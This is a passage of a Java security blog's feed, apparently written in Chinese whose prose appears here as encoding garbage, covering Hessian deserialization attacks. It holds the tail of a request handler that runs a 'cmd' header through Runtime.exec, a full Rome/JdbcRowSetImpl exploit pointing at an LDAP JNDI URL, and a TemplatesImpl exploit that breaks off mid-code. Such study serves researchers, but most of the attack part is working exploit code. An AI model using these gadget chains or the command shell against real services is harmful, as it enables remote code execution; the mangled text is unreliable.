class="variable">writer</span> <span class="operator">=</span> getWriter.invoke(resp);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> (String)getHeader.invoke(req, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        String[] commands = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;window&quot;</span>) ? <span class="string">&quot;GBK&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="string">&quot;WIN&quot;</span>)) &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        commands[<span class="number">2</span>] = cmd;</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;flush&quot;</span>).invoke(writer);</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;close&quot;</span>).invoke(writer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨</p><p><a href="https://imgse.com/i/ppcPFTP"><img src="https://s1.ax1x.com/2023/03/28/ppcPFTP.png" alt="ppcPFTP.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hessianååºåˆ—åŒ–</title>
      <link href="/2023/03/25/Hessian/"/>
      <url>/2023/03/25/Hessian/</url>
      
        <content type="html"><![CDATA[<h1 id="å„ç§ååºåˆ—åŒ–æœºåˆ¶"><a href="#å„ç§ååºåˆ—åŒ–æœºåˆ¶" class="headerlink" title="å„ç§ååºåˆ—åŒ–æœºåˆ¶"></a>å„ç§ååºåˆ—åŒ–æœºåˆ¶</h1><p>åœ¨ç½‘ç»œé€šä¿¡è¿‡ç¨‹ä¸­ï¼Œä¼ é€’ä¸€ä¸ªç‰¹å®šçš„å¯¹è±¡æ—¶ï¼Œå°±ä¼šç”¨åˆ°åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æŠ€æœ¯ã€‚</p><p>å¯ä»¥å°†åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–æœºåˆ¶åˆ†å¤§ä½“åˆ†ä¸ºä¸¤ç±»</p><ul><li>åŸºäºBeanå±æ€§è®¿é—®æœºåˆ¶</li><li>åŸºäºFieldæœºåˆ¶</li></ul><h2 id="åŸºäºBeanå±æ€§è®¿é—®æœºåˆ¶"><a href="#åŸºäºBeanå±æ€§è®¿é—®æœºåˆ¶" class="headerlink" title="åŸºäºBeanå±æ€§è®¿é—®æœºåˆ¶"></a>åŸºäºBeanå±æ€§è®¿é—®æœºåˆ¶</h2><ul><li>SnakeYAML</li><li>jYAML</li><li>YamlBeans</li><li>Apache Flex BlazeDS</li><li>Red5 IO AMF</li><li>Jackson</li><li>Castor</li><li>Java XMLDecoder</li><li>â€¦</li></ul><p>å®ƒä»¬æœ¬è´¨çš„åŒºåˆ«æ˜¯å¦‚ä½•åœ¨å¯¹è±¡ä¸Šè®¾ç½®å±æ€§å€¼ï¼Œå®ƒä»¬æœ‰å…±åŒç‚¹ï¼Œä¹Ÿæœ‰è‡ªå·±ç‹¬æœ‰çš„ä¸åŒå¤„ç†æ–¹å¼ã€‚æœ‰çš„é€šè¿‡åå°„è‡ªåŠ¨è°ƒç”¨<code>getter(xxx)</code>å’Œ<code>setter(xxx)</code>è®¿é—®å¯¹è±¡å±æ€§ï¼Œæœ‰çš„è¿˜éœ€è¦è°ƒç”¨é»˜è®¤Constructorï¼Œæœ‰çš„å¤„ç†å™¨ï¼ˆæŒ‡çš„ä¸Šé¢åˆ—å‡ºæ¥çš„é‚£äº›ï¼‰åœ¨ååºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œå¦‚æœç±»å¯¹è±¡çš„æŸäº›æ–¹æ³•è¿˜æ»¡è¶³è‡ªå·±è®¾å®šçš„æŸäº›è¦æ±‚ï¼Œä¹Ÿä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚è¿˜æœ‰XMLDecoderè¿™ç§èƒ½è°ƒç”¨å¯¹è±¡ä»»æ„æ–¹æ³•çš„å¤„ç†å™¨ã€‚æœ‰çš„å¤„ç†å™¨åœ¨æ”¯æŒå¤šæ€ç‰¹æ€§æ—¶ï¼Œä¾‹å¦‚æŸä¸ªå¯¹è±¡çš„æŸä¸ªå±æ€§æ˜¯Objectã€Interfaceã€abstructç­‰ç±»å‹ï¼Œä¸ºäº†åœ¨ååºåˆ—åŒ–æ—¶èƒ½å®Œæ•´æ¢å¤ï¼Œéœ€è¦å†™å…¥å…·ä½“çš„ç±»å‹ä¿¡æ¯ï¼Œè¿™æ—¶å€™å¯ä»¥æŒ‡å®šæ›´å¤šçš„ç±»ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ä¹Ÿä¼šè‡ªåŠ¨è°ƒç”¨å…·ä½“ç±»å¯¹è±¡çš„æŸäº›æ–¹æ³•æ¥è®¾ç½®è¿™äº›å¯¹è±¡çš„å±æ€§å€¼ã€‚è¿™ç§æœºåˆ¶çš„æ”»å‡»é¢æ¯”åŸºäºFieldæœºåˆ¶çš„æ”»å‡»é¢å¤§ï¼Œå› ä¸ºå®ƒä»¬è‡ªåŠ¨è°ƒç”¨çš„æ–¹æ³•ä»¥åŠåœ¨æ”¯æŒå¤šæ€ç‰¹æ€§æ—¶è‡ªåŠ¨è°ƒç”¨æ–¹æ³•æ¯”åŸºäºFieldæœºåˆ¶è¦å¤šã€‚</p><h2 id="åŸºäºFieldæœºåˆ¶"><a href="#åŸºäºFieldæœºåˆ¶" class="headerlink" title="åŸºäºFieldæœºåˆ¶"></a>åŸºäºFieldæœºåˆ¶</h2><p>åŸºäºFieldæœºåˆ¶çš„ååºåˆ—åŒ–æ˜¯é€šè¿‡ç‰¹æ®Šçš„nativeï¼ˆæ–¹æ³•æˆ–åå°„ï¼ˆæœ€åä¹Ÿæ˜¯ä½¿ç”¨äº†nativeæ–¹å¼ï¼‰ç›´æ¥å¯¹Fieldè¿›è¡Œèµ‹å€¼æ“ä½œçš„æœºåˆ¶ï¼Œè€Œä¸æ˜¯é€šè¿‡getterã€setteræ–¹å¼å¯¹å±æ€§èµ‹å€¼ã€‚</p><ul><li>Java Serialization</li><li>Kryo</li><li>Hessian</li><li>json-io</li><li>XStream</li><li>â€¦</li></ul><h1 id="Hessianååºåˆ—åŒ–"><a href="#Hessianååºåˆ—åŒ–" class="headerlink" title="Hessianååºåˆ—åŒ–"></a>Hessianååºåˆ—åŒ–</h1><h2 id="JDBCé“¾"><a href="#JDBCé“¾" class="headerlink" title="JDBCé“¾"></a>JDBCé“¾</h2><p>Hessianæ˜¯äºŒè¿›åˆ¶çš„web serviceåè®®ï¼Œæ˜¯ä¸€ä¸ªè½»é‡çº§çš„remoting onhttpå·¥å…·ï¼Œä¸€ä¸ªè½»é‡çº§çš„Javaåºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–æ¡†æ¶ï¼Œä½¿ç”¨ç®€å•çš„æ–¹æ³•æä¾›äº†RMIçš„åŠŸèƒ½ã€‚ ç›¸æ¯”WebServiceï¼ŒHessianæ›´ç®€å•ã€å¿«æ·ã€‚é‡‡ç”¨çš„æ˜¯äºŒè¿›åˆ¶RPCåè®®ï¼Œå› ä¸ºé‡‡ç”¨çš„æ˜¯äºŒè¿›åˆ¶åè®®ï¼Œæ‰€ä»¥å®ƒå¾ˆé€‚åˆäºå‘é€äºŒè¿›åˆ¶æ•°æ®ã€‚</p><p>å’ŒJavaåŸç”Ÿçš„åºåˆ—åŒ–å¯¹æ¯”ï¼ŒHessianæ›´åŠ é«˜æ•ˆå¹¶ä¸”éå¸¸é€‚åˆäºŒè¿›åˆ¶æ•°æ®ä¼ è¾“ã€‚</p><p><strong>pom.xmlä¸­æ·»åŠ ä¾èµ–</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HessianInput.readObject()</span><br><span class="line">SerializerFactory.readMap()</span><br><span class="line">SerializerFactory.getDeserializer()</span><br><span class="line">HashMap.put()</span><br><span class="line">HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p>å…¥å£ç‚¹åœ¨<code>HessianInput.readObject</code>ï¼Œå› ä¸ºHessianä¼šå°†åºåˆ—åŒ–çš„ç»“æœå¤„ç†æˆä¸€ä¸ªMapï¼Œæ‰€ä»¥åºåˆ—åŒ–ç»“æœçš„ç¬¬ä¸€ä¸ª<code>byte</code>ä¸º<code>M</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123;</span><br><span class="line">  <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> readType();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> _serializerFactory.readMap(<span class="built_in">this</span>, type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›<code>SerializerFactory.readMap</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">readMap</span><span class="params">(AbstractHessianInput in, String type)</span></span><br><span class="line">  <span class="keyword">throws</span> HessianProtocolException, IOException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">Deserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> getDeserializer(type);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (deserializer != <span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">return</span> deserializer.readMap(in);</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨getDeserializerè·å–ä¸€ä¸ªååºåˆ—åŒ–å¯¹è±¡</p><p><strong>SerializerFactory.getDeserializer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Deserializer <span class="title function_">getDeserializer</span><span class="params">(String type)</span></span><br><span class="line">  <span class="keyword">throws</span> HessianProtocolException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (type == <span class="literal">null</span> || type.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  Deserializer deserializer;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line">  <span class="keyword">if</span> (deserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (_cachedTypeDeserializerMap == <span class="literal">null</span>)</span><br><span class="line">          _cachedTypeDeserializerMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">synchronized</span> (_cachedTypeDeserializerMap) &#123;</span><br><span class="line">          _cachedTypeDeserializerMap.put(type, deserializer);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå†åˆ›å»ºHashMapç¼“å­˜æ—¶ï¼Œå°†ä¼ å…¥çš„ç±»å½“ä½œ<code>key</code>åˆ©ç”¨<code>put</code>æ”¾å…¥HashMapä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œå°±å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„hashcode()äº†ï¼Œè€Œå¸¸è§çš„Romeé“¾ä¾¿ç¬¦åˆè¿™ä¸ªè¦æ±‚ï¼Œäºæ˜¯ä¹æ•´ä¸ªé“¾å­å°±æ„é€ é€šäº†</p><p>Romeé“¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br><span class="line">HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p><strong>Exp</strong></p><p>å…ˆå¯åŠ¨IdapæœåŠ¡</p><p><a href="https://imgse.com/i/ppwcWp8"><img src="https://s1.ax1x.com/2023/03/23/ppwcWp8.png" alt="ppwcWp8.png"></a></p><p>æ‰§è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Rome_Jdbc</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:9999/Calc&quot;</span>;</span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] tables= (Object[]) getValue(hashMap,<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">new_tables</span> <span class="operator">=</span> tables[<span class="number">0</span>];</span><br><span class="line">        setValue(new_tables,<span class="string">&quot;key&quot;</span>,equalsBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] s = hessianser(hashMap);</span><br><span class="line">        hessianunser(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] hessianser(Object object) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">        hessianOutput.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessianOutput.writeObject(object);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hessianunser</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hessianInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">        hessianInput.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppwcHkq"><img src="https://s1.ax1x.com/2023/03/23/ppwcHkq.png" alt="ppwcHkq.png"></a></p><h2 id="SignedObjectäºŒæ¬¡ååºåˆ—åŒ–"><a href="#SignedObjectäºŒæ¬¡ååºåˆ—åŒ–" class="headerlink" title="SignedObjectäºŒæ¬¡ååºåˆ—åŒ–"></a>SignedObjectäºŒæ¬¡ååºåˆ—åŒ–</h2><p>ä¸Šé¢ç”¨åˆ°<code>JdbcRowSetImpl</code>é“¾ï¼Œæœ€ç»ˆæ˜¯ä»¥JNDIæ³¨å…¥ä»è€Œæ‰§è¡Œå‘½ä»¤ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥åˆ©ç”¨æ„é€ æ¶æ„Templatesæ¥å®ç°å—ï¼Ÿ</p><p><strong>demo1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Rome_TemplatesImpl_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean1);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        hashMap1.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] tables1= (Object[]) getValue(hashMap1,<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span 